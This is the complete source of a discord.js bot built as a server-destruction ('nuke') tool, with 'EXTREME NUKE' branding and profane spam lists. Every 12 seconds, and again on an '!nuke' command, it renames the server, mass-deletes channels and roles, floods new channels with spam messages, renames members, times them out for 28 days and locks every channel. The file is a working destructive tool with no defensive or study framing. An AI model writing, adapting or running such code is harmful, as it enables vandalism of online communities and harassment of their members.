require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== EXTREME CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const CHAOS_INTERVAL = Number(process.env.CHAOS_INTERVAL) || 12 * 1000; // 12 seconds
const MAX_ACTIONS_PER_TICK = Number(process.env.MAX_ACTIONS_PER_TICK) || 25;

const PROTECTED_CHANNEL = 'aaaaaaaa'; // Will not be deleted

if (!TOKEN) {
  console.error('❌ TOKEN is missing!');
  process.exit(1);
}

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'EXTREME NUKE', 'SERVER DEAD', 'OWNED', 'RIP',
  'GET FUCKED', 'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead',
  'chaos', 'void', 'pain', 'end', 'lmao', 'gg', 'bot-was-here',
  'no-escape', 'server-corpse', 'extreme-nuke'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY',
  'NO HOPE', 'DESTROYED', 'SERVER CORPSE', 'VICTIM'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope'
];

const MESSAGES = [
  '**EXTREME NUKE**', 'SERVER IS DEAD', 'GET FUCKED',
  'NO SURVIVORS', 'OWNED', 'THE END', 'RIP SERVER',
  'YOU CANNOT STOP THIS', 'BOT WINS', 'GOODBYE'
];

// ================== HELPERS ==================
function randomItem(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// ================== EXTREME ACTIONS ==================
const extremeActions = [
  // Rename server
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
  },

  // Mass delete channels
  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    for (const channel of channels) {
      if (channel.name === PROTECTED_CHANNEL) continue;
      await channel.delete('EXTREME NUKE').catch(() => {});
    }
  },

  // Spam create channels + messages
  async (guild) => {
    for (let i = 0; i < 8; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(CHANNEL_NAMES),
          type: ChannelType.GuildText,
        });
        await ch.send(randomItem(MESSAGES)).catch(() => {});
        await ch.send(randomItem(MESSAGES)).catch(() => {});
      } catch (e) {}
    }
  },

  // Delete all roles
  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    for (const role of roles) {
      if (role.id === guild.id) continue;
      if (!role.editable) continue;
      await role.delete('EXTREME NUKE').catch(() => {});
    }
  },

  // Spam create roles
  async (guild) => {
    for (let i = 0; i < 6; i++) {
      await guild.roles.create({
        name: randomItem(ROLE_NAMES),
        color: Colors.Red,
        reason: 'EXTREME NUKE',
      }).catch(() => {});
    }
  },

  // Mass nickname
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.manageable) continue;
      await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
    }
  },

  // Mass long timeout
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.moderatable) continue;
      await member.timeout(28 * 24 * 60 * 60 * 1000, 'EXTREME NUKE').catch(() => {});
    }
  },

  // Mass spam every channel
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    for (const channel of channels.values()) {
      for (let i = 0; i < 4; i++) {
        await channel.send(randomItem(MESSAGES)).catch(() => {});
      }
    }
  },

  // Lock every channel
  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    for (const channel of channels.values()) {
      await channel.permissionOverwrites.edit(guild.roles.everyone, {
        ViewChannel: false,
        SendMessages: false,
        Connect: false,
        Speak: false,
      }).catch(() => {});
    }
  },

  // Change bot name
  async (guild) => {
    await guild.members.me.setNickname('EXTREME NUKE').catch(() => {});
  },
];

// ================== MAIN ==================
async function doExtremeNuke(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
    console.log('⚠️ Missing Administrator permission');
    return;
  }

  console.log(`\n======== EXTREME NUKE on ${guild.name} ========`);

  const selected = [...extremeActions]
    .sort(() => 0.5 - Math.random())
    .slice(0, MAX_ACTIONS_PER_TICK);

  for (const action of selected) {
    try {
      await action(guild);
      await new Promise(r => setTimeout(r, 200));
    } catch (err) {
      console.error('❌', err.message);
    }
  }
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 EXTREME NUKE ACTIVE | Every ${CHAOS_INTERVAL / 1000}s`);
  console.log('This will heavily damage the server.');

  setInterval(async () => {
    const guild = TARGET_GUILD_ID
      ? client.guilds.cache.get(TARGET_GUILD_ID)
      : client.guilds.cache.first();
    if (guild) await doExtremeNuke(guild);
  }, CHAOS_INTERVAL);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!nuke') {
    await message.reply('💣 **EXTREME NUKE LAUNCHED**');
    await doExtremeNuke(message.guild);
  }
});

client.login(TOKEN);
